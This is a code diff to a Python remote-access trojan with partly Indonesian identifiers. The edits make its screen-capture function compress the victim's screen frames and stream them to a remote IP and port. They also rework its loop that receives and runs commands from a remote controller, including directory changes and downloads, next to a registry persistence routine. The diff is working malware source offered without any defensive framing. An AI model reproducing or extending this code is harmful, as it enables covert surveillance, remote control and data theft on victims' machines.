@@ -153,20 +153,33 @@ def execute_persistence(nama_registry, file_exe):
     except:
         pass
     
-def send_screen_record(ip, port=9991):
+def send_screen_record(ip, port=9991,):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     client.connect((ip, port))
-    
+
+    quality = 70
     sct = mss()
     monitor = sct.monitors[1]
+
+    target_buf_size = 1280
 
     while True:
         try:
             img = np.array(sct.grab(monitor))
             frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
 
-            data = pickle.dumps(frame)
+            h, w = frame.shape[:2]
+            if w > target_buf_size:
+                new_h = int(target_buf_size * h / w)
+                frame = cv2.resize(frame, (target_buf_size, new_h), interpolation=cv2.INTER_AREA)
+
+            encode = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
+            res, encoded = cv2.imencode('.jpg', frame, encode)
+
+            data = encoded.tobytes()
             size = struct.pack("Q", len(data))
+
             client.sendall(size + data)
 
             if cv2.waitKey(1) & 0xFF == ord('q'):
@@ -177,8 +190,7 @@ def send_screen_record(ip, port=9991):
             break
 
     client.close()
-    cv2.destroyAllWindows()
-
+    
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -217,11 +229,11 @@ def jalankan_perintah(sok):
     while True:
         perintah = terima_perintah(sok)
         if perintah in ('exit', 'quit'):
+            sys.exit()
+        if perintah in ('background', 'bg'):
             break
-        if perintah == 'clear':
+        elif perintah == 'clear':
             pass
-        elif perintah == 'background':
-            continue
         elif perintah[:3] == 'cd ':
             change_directory(perintah[3:], sok)
         elif perintah[:8] == 'download':
